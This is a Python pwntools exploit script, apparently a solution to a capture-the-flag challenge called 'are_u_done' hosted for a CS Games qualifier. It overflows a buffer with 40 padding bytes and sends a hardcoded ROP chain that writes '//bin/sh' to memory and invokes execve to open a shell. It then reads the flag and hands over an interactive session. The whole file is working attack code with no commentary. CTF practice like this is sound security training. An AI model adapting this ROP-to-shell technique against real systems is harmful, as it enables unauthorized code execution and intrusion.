#!/usr/bin/env python2
from pwn import *

host = "csgames-quals.frigon.app"
port = 8002
binary_path = "./are_u_done"

context.update(arch="amd64", os="linux")

def get_process():
    if args["REMOTE"]:
        return remote(host, port)
    else:
        return process(binary_path)

payload = ""
p = get_process()

if args["PAUSE"]:
    pause()

p.sendlineafter("Aren't you tired of looking at a screen all day?\n", "AAAA")

rop = ''
rop += p64(0x40daeb)
rop += '//bin/sh'
rop += p64(0x400686)
rop += p64(0x6b90e0)
rop += p64(0x468ae9)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0x40daeb)
rop += p64(0)
rop += p64(0x400686)
rop += p64(0x6b90e8)
rop += p64(0x468ae9)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0x400686)
rop += p64(0x6b90e0)
rop += p64(0x4102d3)
rop += p64(0x6b90e8)
rop += p64(0x4493c2)
rop += p64(0x6b90e8)
rop += p64(0x415a24)
rop += p64(0x3b)
rop += p64(0x474f15)

payload += "A" * 40
payload += rop

p.sendlineafter("Understood?\n", payload)

p.sendline("cat flag")

p.interactive()

